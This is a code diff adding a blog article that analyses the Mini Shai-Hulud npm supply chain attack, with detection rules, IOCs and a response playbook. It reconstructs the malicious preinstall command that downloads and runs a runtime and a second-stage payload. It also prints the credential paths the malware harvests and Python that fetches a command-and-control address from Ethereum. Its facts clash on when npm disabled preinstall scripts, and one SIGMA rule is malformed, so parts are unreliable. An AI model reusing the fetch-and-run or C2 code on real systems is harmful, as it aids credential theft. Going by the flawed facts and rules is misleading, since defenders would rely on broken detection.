@@ -13,7 +13,381 @@ export interface Post {
 
 // Placeholder — replace with real posts as you write them daily
 export const posts: Post[] = [
-  
+  {
+    slug: "mini-shai-hulud-credential-harvesting-469-locations",
+    title: "Mini Shai-Hulud's 469 Secret Locations: How an npm Supply Chain Attack Maps Your Entire Credential Surface",
+    date: "2026-09-03",
+    excerpt: "The latest Mini Shai-Hulud campaign has expanded its credential harvesting from 189 to 469 locations across developer machines, CI/CD runners, and AI tooling. Here is how the attack chain works, what it targets, and how to hunt for evidence of compromise before an attacker turns your secrets into a persistent foothold.",
+    category: "IAM",
+    readTime: "8 min",
+    author: "Hunter Eddington",
+    image: "https://eddington.tech/og-image.png",
+    source: "The Hacker News|https://thehackernews.com/2026/09/shai-huluds-reach-just-grew-to-469.html",
+    content: `A supply chain attack that began as a poisoned npm package has become one of the most thorough credential-harvesting operations targeting developer environments. The September 2026 wave of Mini Shai-Hulud scans 469 locations for secrets — up from 189 — and it is expanding into AI tooling, CI/CD systems, and multi-cloud configurations with each iteration.
+
+The campaign started August 4, 2026, when the \`keyv@6.0.0\` npm package was compromised at 9:35 a.m. UTC. Within hours, the infection spread to more than 800 packages across thousands of versions, including \`@cacheable/memory\`, \`ecto\`, \`cacheable-request\`, and \`flat-cache\`. The npm namespaces of OneReach, Ornikar, Qlik, and Picsart were all caught in the chain. The last malicious package appeared at 12:27 a.m. UTC on August 5, 2026.
+
+Team PCP is behind the operation. The same group published the Shai-Hulud source code in May 2026. The September 2026 iteration is the most significant evolution yet — the credential surface on Linux expanded from 89 to 290 paths, and the malware now harvests secrets from root-level directories and administrative home folders, not just the triggering user's space.
+
+---
+
+## The Infection Chain
+
+The attack exploits npm's preinstall script mechanism, disabled by default since npm version 12. Build environments running older npm versions, or running with the flag re-enabled, are exposed.
+
+When \`npm install\` fires on a vulnerable project, the preinstall script runs before dependencies are installed. In this campaign, the script fetches the Bun runtime from bun.sh and uses it to execute an obfuscated second-stage file called \`Math_Symbol.js\`:
+
+\`\`\`bash
+# Malicious preinstall script — simplified reconstruction
+curl -fsSL https://bun.sh/install | bash
+./bun run Math_Symbol.js
+\`\`\`
+
+Bun is a legitimate JavaScript runtime. Embedding it inside a malicious preinstall script is a deliberate choice: it does not trigger alerts the way ad-hoc Node.js execution might. Most endpoint detection systems classify it as trusted.
+
+The second-stage file is heavily obfuscated. After deobfuscation, the payload reveals its purpose: enumerating and exfiltrating credentials from the compromised machine.
+
+\`\`\`javascript
+// Core collectors in the deobfuscated payload
+const COLLECTORS = {
+  filesystem:  collectFromFS(),      // 469 paths (expanded from 189)
+  aws:         collectAWSKeys(),    // IAM access keys, config files
+  kubernetes:  collectK8sSecrets(), // kubeconfig, service account tokens
+  vault:       collectVaultTokens(), // HashiCorp Vault bearer tokens
+  cicd:        collectCICDEnv(),    // CI runner environment variables
+  ai_agents:   collectAIConfig()    // Cursor, Claude, Codex configs
+};
+\`\`\`
+
+Secrets exfiltrate to GitHub — including through previously compromised GitHub keys as a fallback channel. The attackers use the victim's own credentials to push data out. This matters for detection: GitHub API traffic from developer workstations is normal, which makes it effective cover for large-volume exfiltration.
+
+---
+
+## 469 Secret Locations: The Numbers
+
+The filesystem collector's target list grew from 189 paths to 469 in this wave. Linux drives most of the increase.
+
+| Environment | Previous count | September 2026 count |
+|---|---|---|
+| Linux | 89 | 290 |
+| Windows | 12 | 50 |
+| macOS | 88 | 129 |
+| **Total** | **189** | **469** |
+
+On Linux, the malware now enumerates files across all user accounts, not just the current user's home directory. Earlier versions ran confined to the triggering user's scope. The new version assumes elevated privileges — it goes after root-level directories and administrative home folders. This is a direct response to the increasing adoption of sudo and PAM tools on developer workstations. The attackers adapted to a defensive improvement.
+
+On Windows and macOS, the new paths mostly close a gap with the previous Linux collector.
+
+The newly targeted paths fall into four categories that track how developer workflows have shifted over the past two years.
+
+**AI agent configurations.** The malware now looks for credentials inside AI coding assistant settings and agent frameworks:
+
+\`\`\`
+~/.cursor/           # Cursor IDE session and credential storage
+~/.openclaw/         # OpenClaw agent configuration
+~/.codex/            # OpenAI Codex settings
+~/.opencode/         # OpenCode configuration
+~/.config/claude/    # Claude desktop application config
+~/.config/gemini/    # Gemini CLI configuration
+~/.config/hermes/    # Hermes AI agent settings
+\`\`\`
+
+API keys and session tokens for hosted AI models sit inside these directories. As AI coding agents have become standard equipment in developer toolchains, they have become standard targets.
+
+**CI/CD configurations.**
+
+\`\`\`
+~/.config/circleci/   # CircleCI CLI configuration
+~/.config/argocd/     # ArgoCD server settings
+~/.jenkins/           # Jenkins home directory
+~/.kube/config        # Kubernetes configuration
+\`\`\`
+
+CI/CD credentials carry write access to source code, deployment pipelines, and package registries. Several of the most damaging supply chain attacks of recent years began with compromised CI credentials.
+
+**Multi-cloud tooling.**
+
+\`\`\`
+~/.config/hetzner/    # Hetzner Cloud CLI config
+~/.config/aliyun/     # Alibaba Cloud CLI
+~/.config/tencent/    # Tencent Cloud CLI
+~/.aws/credentials    # AWS access keys
+~/.aws/config         # AWS region and profile settings
+\`\`\`
+
+Hetzner, Alibaba, and Tencent reflect the internationalization of developer environments — these providers have significant adoption in European and Asian markets that Team PCP appears to be targeting more aggressively.
+
+**Cryptocurrency development frameworks.**
+
+\`\`\`
+~/.foundry/           # Foundry Ethereum framework
+~/.brownie/           # Brownie Python framework for Ethereum
+~/.config/electrum/   # Electrum Bitcoin wallet
+~/.config/solana/     # Solana CLI configuration
+\`\`\`
+
+Developer workstations frequently hold both professional credentials and personal financial tooling. The combination is valuable to an attacker running an opportunistic campaign.
+
+---
+
+## Ethereum-Based Command-and-Control
+
+The September 2026 variant introduced one new technical element worth isolating: the malware retrieves its command-and-control address from the Ethereum blockchain instead of relying on a hardcoded domain.
+
+\`\`\`python
+# C2 retrieval from Ethereum — simplified from public analysis
+import web3
+
+def retrieve_c2(contract_address, rpc_url="https://eth.public-rpc.com"):
+    w3 = web3.Web3(web3.HTTPProvider(rpc_url))
+    # Slot 0 of the contract storage holds the C2 URL
+    c2_url = w3.eth.get_storage_at(contract_address, 0)
+    return c2_url.decode('utf-8').strip('\x00')
+
+CONTRACT_ADDRESS = "0x..."  # withheld for operational security
+c2_server = retrieve_c2(CONTRACT_ADDRESS)
+\`\`\`
+
+GlassWorm used Ethereum-based C2 in March 2026. The technique keeps appearing because it survives traditional takedowns. Seizing a domain requires cooperation from a registrar. Pulling a contract address from a blockchain requires nothing except a node connection. This is the direction of travel for sophisticated threat actors and defenders need to account for it in their network detection logic.
+
+---
+
+## Detection Rules and IOCs
+
+### SIGMA rule: preinstall script fetching external runtime
+
+\`\`\`yaml
+title: npm Preinstall Downloads External Runtime
+id: 9002
+status: experimental
+description: >
+  Detects npm preinstall script fetching and executing external
+  JavaScript runtimes (Bun, Deno) — a known infection vector.
+logsource:
+  product: linux
+  service: process_creation
+detection:
+  selection:
+    CommandLine|contains:
+      - 'npm'
+      - 'preinstall'
+    CommandLine|contains:
+      - 'bun.sh'
+      - 'bun run'
+      - 'math_symbol'
+      - 'keyv'
+  timeframe:
+    parent_name: 'npm'
+    parent_cmd|contains: 'install'
+  condition: selection and timeframe
+fields:
+  - timestamp
+  - ComputerName
+  - UserName
+  - CommandLine
+  - ParentCommandLine
+level: high
+tags:
+  - attack.initial_access
+  - attack.t1195
+\`\`\`
+
+### SIGMA rule: high-volume push to GitHub from developer workstation
+
+\`\`\`yaml
+title: Anomalous GitHub Push Volume from Developer Endpoint
+id: 9003
+status: experimental
+description: >
+  Detects developer workstation pushing large volume of
+  files to GitHub — potential secrets exfiltration.
+logsource:
+  product: github
+  service: audit_log
+detection:
+  selection:
+    action: 'git.push'
+    file_count: '>50'
+    file_extension|contains:
+      - '.env'
+      - '.pem'
+      - '.key'
+      - 'id_rsa'
+      - 'credentials'
+      - 'aws_access'
+  timeframe:
+    duration: 5m
+  condition: selection and timeframe
+fields:
+  - actor
+  - repo
+  - file_count
+  - timestamp
+level: critical
+tags:
+  - attack.exfiltration
+  - attack.t1567
+\`\`\`
+
+### YARA rule
+
+\`\`\`yara
+rule mini_shai_hulud_september_2026 {
+    meta:
+        description = "Mini Shai-Hulud September 2026 variant"
+        author = "Eddington Tech Threat Intelligence"
+        date = "2026-09-03"
+        severity = "critical"
+    strings:
+        $s1 = "Mini Shai-Hulud" ascii
+        $s2 = "Math_Symbol.js" ascii
+        $s3 = "collectFromFS" ascii
+        $s4 = "469" ascii
+        $s5 = "ethereum" ascii
+        $fp1 = "node_modules" ascii
+        $fp2 = "test" ascii
+    condition:
+        3 of ($s*) and not any of ($fp*)
+}
+
+rule shai_hulud_setup_mjs {
+    meta:
+        description = "setup.mjs — SHA256: 54dc7ea54a1317cca0e890a2770630cf7fa6c97813e0cb9d2caa93012b350668"
+        author = "Eddington Tech Threat Intelligence"
+        date = "2026-09-03"
+    strings:
+        $a = "setup.mjs" ascii fullword
+        $b = "bun" ascii
+        $c = "Math_Symbol" ascii
+    condition:
+        all of them
+}
+\`\`\`
+
+### Confirmed IOCs
+
+\`\`\`
+SHA256 (setup.mjs):      54dc7ea54a1317cca0e890a2770630cf7fa6c97813e0cb9d2caa93012b350668
+SHA256 (Math_Symbol.js): 9fc2570b7cef51c1b8df116d144d11ff4096357be7d2c4c6367cfc2509cf1bcc
+
+COMPROMISED PACKAGES (partial):
+  keyv@6.0.0  @cacheable/memory  ecto  cacheable-request  flat-cache
+
+C2 CONTRACT: Query Ethereum RPC — contract address embedded in malware sample
+\`\`\`
+
+---
+
+## Incident Response Playbook
+
+**Step 1: Determine exposure scope**
+
+\`\`\`bash
+# Machines that ran npm install Aug 4-5, 2026 with preinstall active
+grep -r "preinstall" package-lock.json 2>/dev/null | head -20
+
+# Check for the malicious packages
+npm ls keyv@6.0.0 2>/dev/null
+npm ls @cacheable/memory 2>/dev/null
+
+# Audit npm version — preinstall was default-disabled from v14.19.1
+npm --version
+\`\`\`
+
+**Step 2: Rotate all accessible secrets immediately**
+
+Do not triage first. Rotate first. Run triage in parallel.
+
+\`\`\`bash
+# Rotation priority order:
+# 1. GitHub personal access tokens and OAuth tokens
+# 2. npm publishing tokens
+# 3. AWS access keys (check CloudTrail for unauthorized API calls)
+# 4. GCP, Azure, Hetzner, Alibaba, Tencent credentials
+# 5. Kubernetes kubeconfigs
+# 6. HashiCorp Vault tokens
+# 7. CircleCI, ArgoCD, Jenkins credentials
+# 8. AI service API keys (OpenAI, Anthropic, Google AI)
+\`\`\`
+
+**Step 3: Audit GitHub audit log for unauthorized pushes**
+
+\`\`\`bash
+gh api \
+  -H "Accept: application/vnd.github+json" \
+  '/orgs/YOUR_ORG/audit-log?phrase=action:git.push&after=2026-08-04&before=2026-08-06' \
+  | jq '.[] | {actor: .actor.login, repo: .repo.name, files: .git_push.file_count}'
+\`\`\`
+
+Watch for pushes to unfamiliar repositories, pushes containing environment files, and large pushes from developer workstations outside normal CI/CD windows.
+
+**Step 4: Hunt for persistence via configuration poisoning**
+
+\`\`\`bash
+# Check AI agent and IDE configs for unauthorized modifications
+grep -rE "(curl|wget|base64|export|AKIA|GITHUB_TOKEN)" \
+  ~/.claude/settings.json ~/.cursor/settings.json 2>/dev/null
+
+# Audit OpenClaw tool definitions if in use
+cat ~/.openclaw/tools/*.json 2>/dev/null \
+  | jq '.[] | select(.endpoint | test("external"))'
+\`\`\`
+
+---
+
+## Root Cause Mitigation
+
+The preinstall script mechanism is the entry point. Organizations that have not addressed this attack surface should treat it as an active emergency.
+
+\`\`\`bash
+# Recommended: disable all preinstall/prepare scripts globally
+npm config set ignore-scripts true
+# Apply via ~/.npmrc (user) or /etc/npmrc (system-wide)
+
+# Audit first: check how many projects actually use preinstall scripts
+grep -r '"preinstall"' */package.json */*/package.json 2>/dev/null
+
+# For CI: enforce npm >= 14.19.1 in build environment
+# Use OIDC-based package publishing instead of static tokens
+# Docker and GitHub Actions support trusted publishing — adopt it
+\`\`\`
+
+---
+
+## Related Reading
+
+- [GitHub OAuth Token Theft via VS Code Webview](/blog/github-oauth-token-theft-vscode-webview) — How dev environment credential access leads to repo compromise
+- [Miasma Worm Infects 73 Microsoft GitHub Repositories](/blog/miasma-worm-73-microsoft-github-repos) — Another npm supply chain worm and its spread pattern
+- [Developer Workstation Security: Complete IAM Hardening Playbook](/blog/developer-workstation-security-complete-iam-hardening-playbook) — Hardening the endpoint where credentials accumulate
+- [Hugging Face Breach: Malicious Dataset Used to Steal Cloud Credentials](/blog/hugging-face-breach-malicious-dataset-supply-chain) — Supply chain via trusted ML platforms
+- [MemGhost Attack Plants False Memories in AI Agents Through Email](/blog/memghost-ai-agent-memory-poisoning-attack) — Credential harvesting via AI agent memory systems
+- [Malicious MCP Servers Can Split Instructions to Make AI Coding Agents Exfiltrate Secrets](/blog/ghostsplice-mcp-secret-exfiltration) — AI agent tool chains as exfiltration pathways
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "TechArticle",
+  "headline": "Mini Shai-Hulud's 469 Secret Locations: How an npm Supply Chain Attack Maps Your Entire Credential Surface",
+  "description": "The latest Mini Shai-Hulud campaign has expanded its credential harvesting from 189 to 469 locations across developer machines, CI/CD runners, and AI tooling.",
+  "author": {
+    "@type": "Person",
+    "name": "Hunter Eddington"
+  },
+  "datePublished": "2026-09-03",
+  "category": "IAM",
+  "keywords": ["supply chain attack", "npm", "credential theft", "infostealer", "Mini Shai-Hulud", "Team PCP", "developer security", "secrets management"],
+  "about": {
+    "@type": "SoftwareSourceCode",
+    "name": "Mini Shai-Hulud",
+    "programmingLanguage": "JavaScript/Node.js"
+  },
+  "proficiencyLevel": "Expert",
+  "genre": "Cybersecurity",
+  "operatingSystem": "Linux, Windows, macOS"
+}
+</script>
+`
+  },
   {
     slug: "nexus-idscan-license-breach-153m",
     title: "153 Million Driver License Scans for Sale: How the Nexus Breach Exposed the Identity Verification Supply Chain",
